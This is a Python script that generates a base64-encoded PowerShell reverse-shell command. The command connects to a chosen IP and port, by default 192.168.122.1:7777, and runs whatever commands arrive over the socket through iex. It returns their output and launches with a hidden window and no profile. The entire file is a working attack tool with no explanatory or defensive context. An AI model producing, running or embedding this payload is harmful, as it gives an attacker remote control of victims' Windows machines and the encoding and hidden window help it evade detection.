#!/usr/bin/env python3

import sys
import base64

# ----------------------------------------    

IP = "192.168.122.1"
PORT = 7777

def gen_payload(ip, port):
    payload = f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\", {port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    
    payload = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

    return payload

# ----------------------------------------

def main():
    global IP, PORT
    
    ip, port = "", 0
    if len(sys.argv) < 3:
        print(f"[INFO]: Usage {sys.argv[0]} <IP> <PORT>")
        ip, port = IP, PORT
    else:
        ip, port = sys.argv[1], sys.argv[2]

    print(f"[INFO]: OK")
    print(f"[INFO]: Generating payload for {ip=} AND {port=}")
    
    payload = gen_payload(ip, port)

    print(f"[INFO]: Payload below\n")
    print(payload)
    print()
    
# ----------------------------------------

    
if __name__ == "__main__":
    main()
